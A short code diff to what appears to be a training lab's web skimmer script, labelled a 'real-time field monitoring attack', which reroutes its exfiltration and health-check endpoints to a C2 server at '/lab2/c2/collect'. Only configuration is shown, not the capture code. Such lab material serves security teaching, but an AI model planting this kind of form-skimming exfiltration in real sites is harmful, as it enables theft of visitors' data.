@@ -21,16 +21,10 @@
   console.log('[DOM-Monitor] Initializing real-time field monitoring attack...')
 
   // Attack configuration
-  // Dynamically determine C2 URL based on environment
-  const hostname = window.location.hostname
-  let exfilUrl = 'http://localhost:9004/collect' // Local development default
-  let healthUrl = 'http://localhost:9004/health' // Local development default
-
-  // Production and staging - use relative URL since C2 is proxied by nginx
-  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
-    exfilUrl = window.location.origin + '/collect'
-    healthUrl = window.location.origin + '/health'
-  }
+  // Use Traefik path-based routing for all environments (local, staging, production)
+  // The C2 server is proxied at /lab2/c2/* by Traefik
+  const exfilUrl = window.location.origin + '/lab2/c2/collect'
+  const healthUrl = window.location.origin + '/lab2/c2/health'
 
   /**
    * Health Check - Ping C2 server on page load to ensure it's ready
